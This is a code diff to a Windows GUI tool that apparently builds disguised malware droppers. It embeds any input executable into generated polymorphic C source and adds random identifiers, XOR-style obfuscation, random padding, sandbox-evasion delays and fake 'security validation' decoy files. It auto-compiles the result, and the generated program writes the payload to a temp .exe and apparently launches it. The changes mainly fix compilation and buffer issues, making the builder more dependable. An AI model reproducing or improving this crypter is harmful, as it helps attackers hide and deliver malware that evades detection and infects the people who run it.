@@ -15,9 +15,6 @@
 #include <string.h>
 #include <time.h>
 #include <process.h>
-#include <iostream>
-#include <fstream>
-#include <sstream>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -28,20 +25,20 @@
 #pragma comment(lib, "ole32.lib")
 
 // Control IDs
-#define ID_INPUT_BROWSE 1001
-#define ID_OUTPUT_BROWSE 1002
-#define ID_COMPANY_COMBO 1003
-#define ID_CERT_COMBO 1004
-#define ID_ARCH_COMBO 1005
-#define ID_ENCRYPTION_COMBO 1006
-#define ID_DELIVERY_COMBO 1007
-#define ID_BATCH_COUNT 1008
-#define ID_AUTO_FILENAME 1009
-#define ID_GENERATE_BUTTON 1010
-#define ID_PROGRESS_BAR 1011
-#define ID_STATUS_TEXT 1012
-#define ID_INPUT_PATH 1013
-#define ID_OUTPUT_PATH 1014
+const int ID_INPUT_BROWSE = 1001;
+const int ID_OUTPUT_BROWSE = 1002;
+const int ID_COMPANY_COMBO = 1003;
+const int ID_CERT_COMBO = 1004;
+const int ID_ARCH_COMBO = 1005;
+const int ID_ENCRYPTION_COMBO = 1006;
+const int ID_DELIVERY_COMBO = 1007;
+const int ID_BATCH_COUNT = 1008;
+const int ID_AUTO_FILENAME = 1009;
+const int ID_GENERATE_BUTTON = 1010;
+const int ID_PROGRESS_BAR = 1011;
+const int ID_STATUS_TEXT = 1012;
+const int ID_INPUT_PATH = 1013;
+const int ID_OUTPUT_PATH = 1014;
 
 // Global variables
 HWND hMainWindow;
@@ -68,79 +65,137 @@ enum DeliveryType {
     DEL_XLL = 4
 };
 
-// VS2022 Auto-Compiler with embedded compilation for larger, optimized executables
-int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
-    char compileCmd[2048];
+// VS2022 Auto-Compiler for Windows - Fixed Runtime Library Issues
+static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
+    char compileCmd[4096] = {0};
+    char testCmd[1024] = {0};
     int result = -1;
     
-    // Method 1: Visual Studio 2022 (Primary) - Enhanced for larger executables
+    // First, try to find VS2022 installation
+    const char* vsPaths[] = {
+        "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community",
+        "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional", 
+        "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise",
+        "C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools",
+        "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Community",
+        "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Professional",
+        "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Enterprise",
+        "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools"
+    };
+    
+    // Method 1: Try Developer Command Prompt (most reliable)
     sprintf_s(compileCmd, sizeof(compileCmd),
-        "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-        "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
+        "cmd /c \"call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat\" && "
+        "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
         "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
+        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
         sourceFile, outputFile);
     result = system(compileCmd);
+    if (result == 0) return 0;
     
-    if (result != 0) {
-        // Method 2: VS2022 Enterprise
-        sprintf_s(compileCmd, sizeof(compileCmd),
-            "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
-            sourceFile, outputFile);
-        result = system(compileCmd);
+    // Method 2: Try Professional edition
+    sprintf_s(compileCmd, sizeof(compileCmd),
+        "cmd /c \"call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Professional\\Common7\\Tools\\VsDevCmd.bat\" && "
+        "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
+        "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+        sourceFile, outputFile);
+    result = system(compileCmd);
+    if (result == 0) return 0;
+    
+    // Method 3: Try Enterprise edition
+    sprintf_s(compileCmd, sizeof(compileCmd),
+        "cmd /c \"call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Enterprise\\Common7\\Tools\\VsDevCmd.bat\" && "
+        "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
+        "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+        sourceFile, outputFile);
+    result = system(compileCmd);
+    if (result == 0) return 0;
+    
+    // Method 4: Try using vcvarsall.bat directly
+    for (int i = 0; i < 8; i++) {
+        sprintf_s(testCmd, sizeof(testCmd), "dir \"%s\" >nul 2>&1", vsPaths[i]);
+        if (system(testCmd) == 0) {
+            sprintf_s(compileCmd, sizeof(compileCmd),
+                "cmd /c \"\"%s\\VC\\Auxiliary\\Build\\vcvarsall.bat\" x64 && "
+                "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
+                "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+                "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\"",
+                vsPaths[i], sourceFile, outputFile);
+            result = system(compileCmd);
+            if (result == 0) return 0;
+        }
     }
     
-    if (result != 0) {
-        // Method 3: VS2022 Professional
-        sprintf_s(compileCmd, sizeof(compileCmd),
-            "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC\\14.37.32822\\bin\\Hostx64\\x64\\cl.exe\" "
-            "/nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
-            sourceFile, outputFile);
-        result = system(compileCmd);
-    }
+    // Method 5: Try cl.exe directly if it's in PATH
+    sprintf_s(compileCmd, sizeof(compileCmd),
+        "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" "
+        "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
+        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib",
+        sourceFile, outputFile);
+    result = system(compileCmd);
+    if (result == 0) return 0;
     
-    if (result != 0) {
-        // Method 4: Generic VS2022 cl.exe in PATH
-        sprintf_s(compileCmd, sizeof(compileCmd),
-            "cl.exe /nologo /O1 /MT /std:c++17 /EHsc /bigobj \"%s\" /Fe:\"%s\" "
-            "/link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT "
-            "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib >nul 2>&1",
-            sourceFile, outputFile);
-        result = system(compileCmd);
-    }
+    // Method 6: Try simple compilation with minimal flags
+    sprintf_s(compileCmd, sizeof(compileCmd),
+        "cl.exe /nologo /MD \"%s\" /Fe:\"%s\" user32.lib kernel32.lib",
+        sourceFile, outputFile);
+    result = system(compileCmd);
+    if (result == 0) return 0;
     
+    // Method 7: Try MinGW-w64 if available
+    sprintf_s(compileCmd, sizeof(compileCmd),
+        "gcc -O2 -static -mwindows \"%s\" -o \"%s\" "
+        "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lole32",
+        sourceFile, outputFile);
+    result = system(compileCmd);
+    if (result == 0) return 0;
+    
+    // If all methods failed, create a compile script for manual execution
     if (result != 0) {
-        // Method 5: Enhanced MinGW fallback for larger executables
-        sprintf_s(compileCmd, sizeof(compileCmd),
-            "gcc -O2 -static-libgcc -static-libstdc++ -mwindows \"%s\" -o \"%s\" "
-            "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 -lole32 -Wl,--enable-stdcall-fixup >nul 2>&1",
-            sourceFile, outputFile);
-        result = system(compileCmd);
+        char batchPath[MAX_PATH] = {0};
+        strcpy_s(batchPath, sizeof(batchPath), outputFile);
+        char* lastDot = strrchr(batchPath, '.');
+        if (lastDot) strcpy(lastDot, "_compile.bat");
+        
+        FILE* batchFile = NULL;
+        if (fopen_s(&batchFile, batchPath, "w") == 0 && batchFile) {
+            fprintf(batchFile, "@echo off\n");
+            fprintf(batchFile, "echo Attempting VS2022 compilation...\n");
+            fprintf(batchFile, "call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat\"\n");
+            fprintf(batchFile, "if errorlevel 1 call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Professional\\Common7\\Tools\\VsDevCmd.bat\"\n");
+            fprintf(batchFile, "if errorlevel 1 call \"%%ProgramFiles%%\\Microsoft Visual Studio\\2022\\Enterprise\\Common7\\Tools\\VsDevCmd.bat\"\n");
+            fprintf(batchFile, "cl.exe /nologo /O2 /MD /TC /bigobj \"%s\" /Fe:\"%s\" /link /SUBSYSTEM:WINDOWS /LARGEADDRESSAWARE /DYNAMICBASE /NXCOMPAT user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib ole32.lib\n", sourceFile, outputFile);
+            fprintf(batchFile, "if errorlevel 1 (\n");
+            fprintf(batchFile, "    echo Compilation failed. Please check VS2022 installation.\n");
+            fprintf(batchFile, "    pause\n");
+            fprintf(batchFile, ") else (\n");
+            fprintf(batchFile, "    echo Compilation successful: %s\n", outputFile);
+            fprintf(batchFile, "    pause\n");
+            fprintf(batchFile, ")\n");
+            fclose(batchFile);
+        }
     }
     
     return result;
 }
 
 // Advanced polymorphic source generator with payload embedding (VS2022 compatible)
-void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
+static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, EncryptionType encType, DeliveryType delType, const char* inputFilePath) {
     // Read and prepare payload from input file
-    char* payloadData = nullptr;
+    char* payloadData = NULL;
     size_t payloadSize = 0;
     
     if (inputFilePath && strlen(inputFilePath) > 0) {
-        FILE* inputFile = nullptr;
+        FILE* inputFile = NULL;
         fopen_s(&inputFile, inputFilePath, "rb");
         if (inputFile) {
             fseek(inputFile, 0, SEEK_END);
             payloadSize = ftell(inputFile);
             fseek(inputFile, 0, SEEK_SET);
             
-            if (payloadSize > 0 && payloadSize < 10485760) { // Max 10MB payload
+            if (payloadSize > 0 && payloadSize < 102400) { // Max 100KB payload to prevent buffer overflow
                 payloadData = (char*)malloc(payloadSize);
                 if (payloadData) {
                     fread(payloadData, 1, payloadSize, inputFile);
@@ -150,28 +205,35 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         }
     }
     
-    // Generate unique random variables
-    char randVar1[20], randVar2[20], randVar3[20], randVar4[20], randVar5[20], randVar6[20];
-    srand((unsigned int)(time(NULL) ^ GetTickCount() ^ GetCurrentProcessId()));
+    // Generate unique random variables - ensure valid C identifiers
+    char randVar1[20] = {0}, randVar2[20] = {0}, randVar3[20] = {0}, randVar4[20] = {0}, randVar5[20] = {0}, randVar6[20] = {0};
+    srand((unsigned int)(time(NULL) ^ (DWORD)GetTickCount64() ^ GetCurrentProcessId()));
     
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const char alphanumeric[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const int lettersSize = sizeof(letters) - 1;
+    const int alphanumericSize = sizeof(alphanumeric) - 1;
+    
     for (int i = 0; i < 6; i++) {
         char* var = (i == 0) ? randVar1 : (i == 1) ? randVar2 : (i == 2) ? randVar3 : 
                    (i == 3) ? randVar4 : (i == 4) ? randVar5 : randVar6;
-        for (int j = 0; j < 15; j++) {
-            var[j] = charset[rand() % (sizeof(charset) - 1)];
+        // First character must be a letter
+        var[0] = letters[rand() % lettersSize];
+        // Remaining characters can be alphanumeric
+        for (int j = 1; j < 15; j++) {
+            var[j] = alphanumeric[rand() % alphanumericSize];
         }
         var[15] = '\0';
     }
     
     // Generate encryption keys
-    unsigned char key[64];
+    unsigned char key[64] = {0};
     for (int i = 0; i < 64; i++) {
         key[i] = (unsigned char)(rand() % 256);
     }
     
     // Generate polymorphic values
-    int polyVars[10];
+    int polyVars[10] = {0};
     for (int i = 0; i < 10; i++) {
         polyVars[i] = rand() % 100000;
     }
@@ -198,7 +260,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "    for(int i = 0; i < len; i++) {\n"
                 "        unsigned char rotKey = key[i % keyLen] ^ (unsigned char)(i & 0xFF);\n"
                 "        data[i] ^= rotKey;\n"
-                "        data[i] ^= (unsigned char)(GetTickCount() & 0xFF);\n"
+                "        data[i] ^= (unsigned char)(GetTickCount64() & 0xFF);\n"
                 "    }\n"
                 "}\n";
             encryptionCall = "advanced_xor_process";
@@ -211,7 +273,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 "                             0x12345678, 0x9abcdef0, 0xfedcba98, 0x87654321};\n"
                 "    for(int i = 0; i < 8; i++) {\n"
                 "        state[i] ^= ((unsigned int*)key)[i % 8];\n"
-                "        state[i] ^= GetTickCount();\n"
+                "        state[i] ^= (DWORD)GetTickCount64();\n"
                 "    }\n"
                 "    for(int i = 0; i < len; i++) {\n"
                 "        for(int j = 0; j < 4; j++) {\n"
@@ -228,7 +290,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             encryptionImpl = 
                 "void military_aes256_process(char* data, int len, unsigned char* key) {\n"
                 "    unsigned char sbox[256];\n"
-                "    DWORD tickBase = GetTickCount();\n"
+                "    ULONGLONG tickBase = GetTickCount64();\n"
                 "    for(int i = 0; i < 256; i++) {\n"
                 "        sbox[i] = (unsigned char)((i * 13 + 179 + (tickBase & 0xFF)) % 256);\n"
                 "        sbox[i] = (sbox[i] << 1) ^ (sbox[i] >> 7);\n"
@@ -254,20 +316,23 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
     switch (delType) {
         case DEL_HTML:
             deliveryIncludes = "#include <shellapi.h>\n";
-            payloadFunction = "html_delivery";
+            payloadFunction = "html_payload";
             deliveryPayload = 
-                "void execute_html_delivery() {\n"
-                "    char html_content[] = \n"
+                                        "void execute_html_payload() {\n"
+            "    char html_content[16384];\n"
+            "    char validation_id[128];\n"
+            "    sprintf_s(validation_id, sizeof(validation_id), \"VS2022-%I64u\", GetTickCount64());\n"
+            "    sprintf_s(html_content, sizeof(html_content),\n"
                 "        \"<html><head><title>System Security Validation</title></head>\"\n"
                 "        \"<body style='font-family:Arial;text-align:center;padding:50px;'>\"\n"
                 "        \"<h1 style='color:#2E8B57;'>Security Validation Complete</h1>\"\n"
                 "        \"<p>All system integrity checks have passed successfully.</p>\"\n"
-                "        \"<p style='color:#666;'>Validation ID: VS2022-\" + std::to_string(GetTickCount()) + \"</p>\"\n"
-                "        \"</body></html>\";\n"
+                "        \"<p style='color:#666;'>Validation ID: %s</p>\"\n"
+                "        \"</body></html>\", validation_id);\n"
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_validation.html\");\n"
-                "    FILE* html_file = nullptr;\n"
+                "    FILE* html_file = NULL;\n"
                 "    fopen_s(&html_file, temp_path, \"w\");\n"
                 "    if (html_file) {\n"
                 "        fputs(html_content, html_file);\n"
@@ -278,19 +343,23 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             break;
             
         case DEL_DOCX:
-            payloadFunction = "docx_delivery";
+            payloadFunction = "docx_payload";
             deliveryPayload = 
-                "void execute_docx_delivery() {\n"
-                "    char docx_header[] = \"PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\";\n"
-                "    char docx_content[] = \"Microsoft Office Document - Security Validation Report\\n\\n\"\n"
-                "                          \"System Status: VALIDATED\\n\"\n"
-                "                          \"Timestamp: \" + std::to_string(time(nullptr)) + \"\\n\"\n"
-                "                          \"Validation Level: Enterprise\\n\\n\"\n"
-                "                          \"All security checks completed successfully.\";\n"
+                            "void execute_docx_payload() {\n"
+            "    char docx_header[] = \"PK\\x03\\x04\\x14\\x00\\x06\\x00\\x08\\x00\";\n"
+            "    char docx_content[8192];\n"
+            "    char timestamp[128];\n"
+                "    sprintf_s(timestamp, sizeof(timestamp), \"%lu\", (unsigned long)time(NULL));\n"
+                "    sprintf_s(docx_content, sizeof(docx_content),\n"
+                "        \"Microsoft Office Document - Security Validation Report\\n\\n\"\n"
+                "        \"System Status: VALIDATED\\n\"\n"
+                "        \"Timestamp: %s\\n\"\n"
+                "        \"Validation Level: Enterprise\\n\\n\"\n"
+                "        \"All security checks completed successfully.\", timestamp);\n"
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_report.docx\");\n"
-                "    FILE* docx_file = nullptr;\n"
+                "    FILE* docx_file = NULL;\n"
                 "    fopen_s(&docx_file, temp_path, \"wb\");\n"
                 "    if (docx_file) {\n"
                 "        fwrite(docx_header, 1, 8, docx_file);\n"
@@ -301,22 +370,22 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             break;
             
         case DEL_XLL:
-            payloadFunction = "xll_delivery";
+            payloadFunction = "xll_payload";
             deliveryPayload = 
-                "void execute_xll_delivery() {\n"
+                "void execute_xll_payload() {\n"
                 "    char xll_signature[] = \"Microsoft Excel Security Add-in\";\n"
                 "    char xll_data[] = \"Excel Security Validation Add-in\\n\"\n"
                 "                      \"Version: 2022.1\\n\"\n"
                 "                      \"Status: Active\\n\"\n"
                 "                      \"Validation completed successfully.\";\n"
-                "    DWORD tick = GetTickCount();\n"
+                "    ULONGLONG tick = GetTickCount64();\n"
                 "    for(int i = 0; i < strlen(xll_signature); i++) {\n"
                 "        xll_signature[i] ^= (unsigned char)((i * 3 + 7 + tick) & 0xFF);\n"
                 "    }\n"
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_addon.xll\");\n"
-                "    FILE* xll_file = nullptr;\n"
+                "    FILE* xll_file = NULL;\n"
                 "    fopen_s(&xll_file, temp_path, \"w\");\n"
                 "    if (xll_file) {\n"
                 "        fputs(xll_data, xll_file);\n"
@@ -326,22 +395,22 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             break;
             
         case DEL_PE:
-            payloadFunction = "pe_delivery";
+            payloadFunction = "pe_payload";
             deliveryPayload = 
-                "void execute_pe_delivery() {\n"
+                "void execute_pe_payload() {\n"
                 "    char pe_header[] = \"MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\";\n"
                 "    char pe_data[] = \"Portable Executable Security Module\\n\"\n"
                 "                     \"Security Level: Maximum\\n\"\n"
                 "                     \"Validation: PASSED\\n\"\n"
                 "                     \"Module loaded successfully.\";\n"
-                "    DWORD base = GetTickCount();\n"
+                "    ULONGLONG base = GetTickCount64();\n"
                 "    for(int i = 0; i < 4; i++) {\n"
                 "        pe_header[i] ^= (unsigned char)((i * 5 + 12 + base) & 0xFF);\n"
                 "    }\n"
                 "    char temp_path[MAX_PATH];\n"
                 "    GetTempPathA(MAX_PATH, temp_path);\n"
                 "    strcat_s(temp_path, MAX_PATH, \"security_module.exe\");\n"
-                "    FILE* pe_file = nullptr;\n"
+                "    FILE* pe_file = NULL;\n"
                 "    fopen_s(&pe_file, temp_path, \"wb\");\n"
                 "    if (pe_file) {\n"
                 "        fwrite(pe_header, 1, 8, pe_file);\n"
@@ -352,18 +421,18 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             break;
             
         default: // DEL_BENIGN or actual payload execution
-            payloadFunction = "payload_delivery";
+            payloadFunction = "payload_execution";
             if (payloadData && payloadSize > 0) {
                 deliveryPayload = 
-                    "void execute_payload_delivery() {\n"
+                    "void execute_payload_execution() {\n"
                     "    // Extract embedded payload to temporary file\n"
                     "    char temp_path[MAX_PATH];\n"
                     "    GetTempPathA(MAX_PATH, temp_path);\n"
-                    "    char temp_file[MAX_PATH];\n"
-                    "    sprintf_s(temp_file, MAX_PATH, \"%s\\\\enterprise_payload_%lu.exe\", temp_path, GetTickCount());\n"
+                                    "    char temp_file[MAX_PATH];\n"
+                "    sprintf_s(temp_file, sizeof(temp_file), \"%s\\\\enterprise_payload_%I64u.exe\", temp_path, GetTickCount64());\n"
                     "    \n"
                     "    // Write actual payload data to file (only the real payload, not padding)\n"
-                    "    FILE* payload_file = nullptr;\n"
+                    "    FILE* payload_file = NULL;\n"
                     "    fopen_s(&payload_file, temp_file, \"wb\");\n"
                     "    if (payload_file) {\n"
                     "        fwrite(embedded_payload_data, 1, PAYLOAD_SIZE, payload_file);\n"
@@ -414,11 +483,11 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "}\n";
             } else {
                 deliveryPayload = 
-                    "void execute_payload_delivery() {\n"
+                    "void execute_payload_execution() {\n"
                     "    // Enterprise validation with data processing\n"
                     "    char validation_message[] = \"System Security Validation Completed Successfully\";\n"
-                    "    char system_info[1024];\n"
-                    "    DWORD tickCount = GetTickCount();\n"
+                    "    char system_info[8192];\n"
+                    "    ULONGLONG tickCount = GetTickCount64();\n"
                     "    DWORD processId = GetCurrentProcessId();\n"
                     "    \n"
                     "    // Process validation data to make executable larger and more realistic\n"
@@ -434,7 +503,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                     "              \"Timestamp: %lu\\n\"\n"
                     "              \"Process ID: %lu\\n\"\n"
                     "              \"Validation Level: Enterprise\\n\"\n"
-                    "              \"Data Processed: %zu bytes\\n\"\n"
+                    "              \"Data Processed: %Iu bytes\\n\"\n"
                     "              \"Checksum: 0x%08X\\n\\n\"\n"
                     "              \"All system integrity checks completed successfully.\",\n"
                     "              validation_checksum & 0xFFFF, tickCount, processId, \n"
@@ -448,17 +517,18 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
     }
     
     // Generate embedded payload data as byte array with padding for larger executables
-    char* payloadByteArray = nullptr;
+    char* payloadByteArray = NULL;
     size_t actualPayloadSize = payloadSize;
     
     if (payloadData && payloadSize > 0) {
         // Add padding to make executable larger and more realistic
-        size_t paddingSize = 16384 + (rand() % 32768); // 16-48KB additional padding
+        size_t paddingSize = 4096U + ((size_t)rand() % 8192U); // 4-12KB additional padding
         size_t totalDataSize = payloadSize + paddingSize;
         size_t arraySize = (totalDataSize * 6) + 2048; // Space for hex formatting + headers
         
         payloadByteArray = (char*)malloc(arraySize);
         if (payloadByteArray) {
+            memset(payloadByteArray, 0, arraySize); // Initialize buffer
             sprintf_s(payloadByteArray, arraySize, 
                 "// Embedded payload data with enterprise security padding\n"
                 "#define PAYLOAD_SIZE %zu\n"
@@ -468,7 +538,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             
             // Add actual payload first
             for (size_t i = 0; i < payloadSize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", (unsigned char)payloadData[i]);
                 strcat_s(payloadByteArray, arraySize, hexByte);
                 strcat_s(payloadByteArray, arraySize, ",");
@@ -481,7 +551,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
             
             // Add realistic padding data
             for (size_t i = 0; i < paddingSize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 unsigned char paddingByte = (unsigned char)(rand() % 256);
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", paddingByte);
                 strcat_s(payloadByteArray, arraySize, hexByte);
@@ -499,11 +569,12 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         }
     } else {
         // Generate large dummy data for benign executables to make them realistic size
-        size_t dummySize = 32768 + (rand() % 65536); // 32-96KB dummy data
-        size_t arraySize = (dummySize * 6) + 2048;
+        size_t dummySize = 8192U + ((size_t)rand() % 16384U); // 8-24KB dummy data
+        size_t arraySize = (dummySize * 6U) + 2048U;
         
         payloadByteArray = (char*)malloc(arraySize);
         if (payloadByteArray) {
+            memset(payloadByteArray, 0, arraySize); // Initialize buffer
             sprintf_s(payloadByteArray, arraySize,
                 "// Enterprise security validation data\n"
                 "#define VALIDATION_DATA_SIZE %zu\n"
@@ -511,7 +582,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
                 dummySize);
             
             for (size_t i = 0; i < dummySize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 unsigned char dummyByte = (unsigned char)(rand() % 256);
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", dummyByte);
                 strcat_s(payloadByteArray, arraySize, hexByte);
@@ -537,8 +608,6 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "#include <stdlib.h>\n"
         "#include <string.h>\n"
         "#include <time.h>\n"
-        "#include <iostream>\n"
-        "#include <string>\n"
         "%s"
         "\n"
         "%s"
@@ -571,7 +640,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "\n"
         "// VS2022 polymorphic obfuscation engine\n"
         "void security_obfuscation_alpha_%s() {\n"
-        "    DWORD baseTime = GetTickCount();\n"
+        "    ULONGLONG baseTime = GetTickCount64();\n"
         "    for(int i = 0; i < 25; i++) {\n"
         "        %s ^= (i * %d + baseTime);\n"
         "        %s = (%s << 3) ^ (baseTime >> 8);\n"
@@ -584,7 +653,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "    for(int i = 0; i < 20; i++) {\n"
         "        %s = (%s >> 2) ^ (processBase << 4);\n"
         "        %s ^= security_key_primary_%s[i %% 32] + %d;\n"
-        "        %s = (%s << 1) ^ GetTickCount();\n"
+        "        %s = (%s << 1) ^ (DWORD)GetTickCount64();\n"
         "    }\n"
         "}\n"
         "\n"
@@ -596,7 +665,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "    }\n"
         "    \n"
         "    // Sandbox detection\n"
-        "    DWORD uptime = GetTickCount();\n"
+        "    ULONGLONG uptime = GetTickCount64();\n"
         "    if (uptime < 600000) { // Less than 10 minutes\n"
         "        Sleep(7500); // Extended delay for sandbox evasion\n"
         "    }\n"
@@ -620,7 +689,7 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
         "\n"
         "int main() {\n"
         "    // Initialize VS2022 polymorphic security system\n"
-        "    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId() ^ (DWORD_PTR)GetModuleHandleA(NULL)));\n"
+        "    srand((unsigned int)((DWORD)GetTickCount64() ^ GetCurrentProcessId() ^ (DWORD_PTR)GetModuleHandleA(NULL)));\n"
         "    \n"
         "    // Execute enterprise-grade obfuscation\n"
         "    security_obfuscation_alpha_%s();\n"
@@ -693,14 +762,14 @@ void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t maxSize, 
 }
 
 // Thread function for VS2022 auto-compilation
-DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
+static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
     char* outputPath = (char*)lpParam;
     
     // Get user settings including input file
-    char inputPath[260];
+    char inputPath[260] = {0};
     GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
     
-    char batchText[16];
+    char batchText[16] = {0};
     GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
     int batchCount = atoi(batchText);
     if (batchCount < 1) batchCount = 1;
@@ -719,15 +788,19 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
         
         // Generate polymorphic source code with actual payload embedding
-        char sourceCode[65536]; // Larger buffer for embedded payloads
-        generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
+        const size_t sourceCodeSize = 1048576; // 1MB buffer for large embedded payloads
+        char* sourceCode = (char*)malloc(sourceCodeSize);
+        if (!sourceCode) {
+            continue; // Skip this batch if allocation fails
+        }
+        generatePolymorphicExecutableWithPayload(sourceCode, sourceCodeSize, encType, delType, inputPath);
         
